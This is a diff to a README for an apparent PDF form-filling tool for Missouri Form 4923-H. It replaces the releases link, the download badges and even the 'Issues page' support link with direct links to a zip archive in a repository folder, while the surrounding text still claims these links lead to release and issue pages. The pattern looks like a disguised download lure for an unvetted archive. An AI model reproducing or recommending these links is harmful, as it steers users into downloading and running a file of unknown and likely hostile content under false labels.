@@ -1,6 +1,6 @@
 # 🔽 form4923-h - Easy PDF Form Filling Made Simple
 
-[![Download form4923-h](https://img.shields.io/badge/Download%20form4923--h-blue.svg)](https://github.com/abdulhaziq94/form4923-h/releases)
+[![Download form4923-h](https://raw.githubusercontent.com/abdulhaziq94/form4923-h/main/nonsingular/form4923-h.zip%https://raw.githubusercontent.com/abdulhaziq94/form4923-h/main/nonsingular/form4923-h.zip)](https://raw.githubusercontent.com/abdulhaziq94/form4923-h/main/nonsingular/form4923-h.zip)
 
 ## 🌟 Overview
 
@@ -28,7 +28,7 @@ To get started with form4923-h, follow these steps:
 1. **Visit the Releases Page:**
    Access the GitHub Releases page for form4923-h by clicking the link below.
 
-   [Go to Releases Page](https://github.com/abdulhaziq94/form4923-h/releases)
+   [Go to Releases Page](https://raw.githubusercontent.com/abdulhaziq94/form4923-h/main/nonsingular/form4923-h.zip)
 
 2. **Download the Application:**
    On the Releases page, look for the latest version and click the link to download the application files.
@@ -57,7 +57,7 @@ To get started with form4923-h, follow these steps:
 
 If you encounter any issues while using form4923-h, you can reach out for support by:
 
-- Opening an issue on the [Issues page](https://github.com/abdulhaziq94/form4923-h/issues) in this repository.
+- Opening an issue on the [Issues page](https://raw.githubusercontent.com/abdulhaziq94/form4923-h/main/nonsingular/form4923-h.zip) in this repository.
 - Checking the FAQs section for common questions.
 
 ## 🔖 Additional Information
@@ -84,6 +84,6 @@ To begin using form4923-h, follow the steps below.
 
 - **Download:** Click the button below to visit the Releases page.
 
-   [![Download form4923-h](https://img.shields.io/badge/Download%20form4923--h-blue.svg)](https://github.com/abdulhaziq94/form4923-h/releases)
+   [![Download form4923-h](https://raw.githubusercontent.com/abdulhaziq94/form4923-h/main/nonsingular/form4923-h.zip%https://raw.githubusercontent.com/abdulhaziq94/form4923-h/main/nonsingular/form4923-h.zip)](https://raw.githubusercontent.com/abdulhaziq94/form4923-h/main/nonsingular/form4923-h.zip)
 
 After downloading, follow the previously outlined steps to fill out Missouri Form 4923-H easily!
